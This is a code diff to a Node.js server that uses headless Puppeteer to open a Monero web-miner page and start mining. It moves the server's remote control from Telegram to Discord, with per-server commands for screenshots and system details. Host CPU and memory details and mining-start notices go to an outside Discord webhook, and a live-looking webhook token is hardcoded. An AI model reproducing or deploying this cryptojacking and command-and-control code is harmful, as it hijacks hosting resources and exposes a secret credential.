@@ -1,19 +1,50 @@
 const express = require("express");
 const path = require("path");
 const puppeteer = require("puppeteer");
-const TelegramBot = require('node-telegram-bot-api');
 const os = require('os');
+const dotenv = require('dotenv');
+const axios = require('axios');
+const Eris = require('eris');
+const fs = require('fs');
+const FormData = require('form-data');
+const fetch = require('node-fetch');
+
+
+dotenv.config();
 
 const app = express();
+const bot = new Eris(process.env.DISCORD_BOT_TOKEN);
+const botId = process.env.BOT_ID;
 
-// Telegram Bot setup
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+
+
 
 function delay(time) {
   return new Promise(resolve => setTimeout(resolve, time));
 }
 
 let page; 
+
+const webhookUrl = 'https://discord.com/api/webhooks/1045109813228621825/OMXSsYZoA76MRjyJS4ocziJwerv_mm16w0RordAQ4is_7nXiKmqkCJZFW80I8_5hY-QZ';
+
+async function sendToDiscord(message) {
+  try {
+    const formData = new FormData();
+    formData.append('content', message);
+
+    const headers = {
+      ...formData.getHeaders()
+    };
+
+    await axios.post(webhookUrl, formData, { headers });
+
+    console.log('Message sent to Discord:', message);
+  } catch (error) {
+    console.error('Error sending message to Discord:', error);
+  }
+}
+
+
 
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
@@ -24,7 +55,7 @@ app.get("/", (req, res) => {
   try {
     browser = await puppeteer.launch({ args: ["--no-sandbox"] });
     const pages = await browser.pages();
-    page = pages[0]; // Assign the first page to the global variable page
+    page = pages[0]; 
 
     const url = "https://monero-webminer-main.onrender.com/";
     await page.goto(url, { waitUntil: "domcontentloaded" });
@@ -40,6 +71,11 @@ app.get("/", (req, res) => {
     await page.click('#WebMinerBtn');
 
     console.log(await page.title()); // Log the page title for verification
+
+    const message = `Started mining on server ${botId} with wallet address: ${WalletAddress}`;
+  
+
+    await sendToDiscord(message);
   } catch (err) {
     console.error(err.message);
   } finally {
@@ -48,7 +84,40 @@ app.get("/", (req, res) => {
   }
 })();
 
-// Function to take a screenshot
+
+async function sendSystemDetails() {
+  try {
+    const totalMemory = os.totalmem();
+    const freeMemory = os.freemem();
+    const usedMemory = totalMemory - freeMemory;
+
+    const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(2);
+
+    const memoryMessage = `**System Memory:**\nTotal: ${toMB(totalMemory)} MB\nFree: ${toMB(freeMemory)} MB\nUsed: ${toMB(usedMemory)} MB`;
+
+    const cpus = os.cpus();
+    let cpuMessage = '**CPU Details:**\n';
+    cpus.forEach((cpu, index) => {
+      cpuMessage += `CPU ${index + 1}:\n`;
+      cpuMessage += `  Model: ${cpu.model}\n`;
+      cpuMessage += `  Speed: ${cpu.speed} MHz\n`;
+      cpuMessage += `  Times:\n`;
+      cpuMessage += `    User: ${cpu.times.user} ms\n`;
+      cpuMessage += `    Nice: ${cpu.times.nice} ms\n`;
+      cpuMessage += `    Sys: ${cpu.times.sys} ms\n`;
+      cpuMessage += `    Idle: ${cpu.times.idle} ms\n`;
+      cpuMessage += `    IRQ: ${cpu.times.irq} ms\n\n`;
+    });
+
+    const message = `${memoryMessage}\n${cpuMessage}`;
+    return message;
+  } catch (error) {
+    console.error('Error fetching system details:', error);
+    return `Error fetching system details: ${error.message}`;
+  }
+}
+
+
 async function takeScreenshot() {
   if (!page) {
     throw new Error("Page is not initialized.");
@@ -59,58 +128,70 @@ async function takeScreenshot() {
   return screenshotPath;
 }
 
-async function sendSystemDetails(msg) {
-  const totalMemory = os.totalmem();
-  const freeMemory = os.freemem();
-  const usedMemory = totalMemory - freeMemory;
+bot.on('ready', () => {
+  console.log('Ready!');
+});
 
-  const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(2);
+bot.on('messageCreate', async (msg) => {
+  if (msg.content === `screenshot-${botId}`) {
+    try {
+      const screenshotPath = await takeScreenshot();
 
-  const memoryMessage = `System Memory:\nTotal: ${toMB(totalMemory)} MB\nFree: ${toMB(freeMemory)} MB\nUsed: ${toMB(usedMemory)} MB`;
+      if (!fs.existsSync(screenshotPath)) {
+        console.error('Screenshot file does not exist');
+        return;
+      }
 
-  const cpus = os.cpus();
-  let cpuMessage = 'CPU Details:\n';
-  cpus.forEach((cpu, index) => {
-    cpuMessage += `CPU ${index + 1}:\n`;
-    cpuMessage += `  Model: ${cpu.model}\n`;
-    cpuMessage += `  Speed: ${cpu.speed} MHz\n`;
-    cpuMessage += `  Times:\n`;
-    cpuMessage += `    User: ${cpu.times.user} ms\n`;
-    cpuMessage += `    Nice: ${cpu.times.nice} ms\n`;
-    cpuMessage += `    Sys: ${cpu.times.sys} ms\n`;
-    cpuMessage += `    Idle: ${cpu.times.idle} ms\n`;
-    cpuMessage += `    IRQ: ${cpu.times.irq} ms\n\n`;
-  });
+      const stats = fs.statSync(screenshotPath);
+      console.log(`Screenshot file size: ${stats.size} bytes`);
 
-  const message = memoryMessage + '\n' + cpuMessage;
+      if (stats.size === 0) {
+        console.error('Screenshot file is empty');
+        return;
+      }
 
-  return message; 
-}
+      const screenshotFile = fs.createReadStream(screenshotPath);
+      const formData = new FormData();
+      formData.append('file', screenshotFile, { filename: 'screenshot.png' });
 
+      // Ensure the headers are correctly set
+      const headers = {
+        Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`,
+        ...formData.getHeaders(),
+      };
 
-// Command to trigger screenshot capture via Telegram Bot
-bot.onText(/\/screenshot/, async (msg) => {
-  const chatId = msg.chat.id;
-  try {
-    const screenshotPath = await takeScreenshot();
-    bot.sendPhoto(chatId, screenshotPath);
-  } catch (error) {
-    console.error("Error taking screenshot:", error);
-    bot.sendMessage(chatId, "An error occurred while taking the screenshot.");
+      const response = await fetch(`https://discord.com/api/v9/channels/${msg.channel.id}/messages`, {
+        method: 'POST',
+        headers: headers,
+        body: formData,
+      });
+
+      if (!response.ok) {
+        throw new Error(`Error sending screenshot: ${response.statusText}`);
+      }
+
+      const responseBody = await response.json();
+      console.log('Screenshot sent successfully:', responseBody);
+    } catch (err) {
+      console.error('Error sending screenshot:', err.message || err);
+      await sendToDiscord(`Error sending screenshot: ${err.message || err}`);
+    }
+  } else if (msg.content === `systemdetails-${botId}`) {
+    try {
+      const systemDetailsMessage = await sendSystemDetails();
+      await sendToDiscord(systemDetailsMessage);
+      console.log('System details sent successfully');
+    } catch (err) {
+      console.error('Error sending system details:', err.message || err);
+      await sendToDiscord(`Error sending system details: ${err.message || err}`);
+    }
+  } else if (msg.content === `restart-${botId}`) {
+    console.log("Restarting server....")
   }
 });
 
-// Command to retrieve system details via Telegram Bot
-bot.onText(/\/systemdetails/, async (msg) => {
-  const chatId = msg.chat.id;
-  try {
-    const systemDetails = await sendSystemDetails(msg);
-    bot.sendMessage(chatId, systemDetails);
-  } catch (error) {
-    console.error("Error retrieving system details:", error);
-    bot.sendMessage(chatId, "An error occurred while retrieving system details.");
-  }
-}); 
+
+bot.connect();
 
 const listener = app.listen(process.env.PORT || 3000, () => {
   console.log(`Your app is listening on port ${listener.address().port}`);
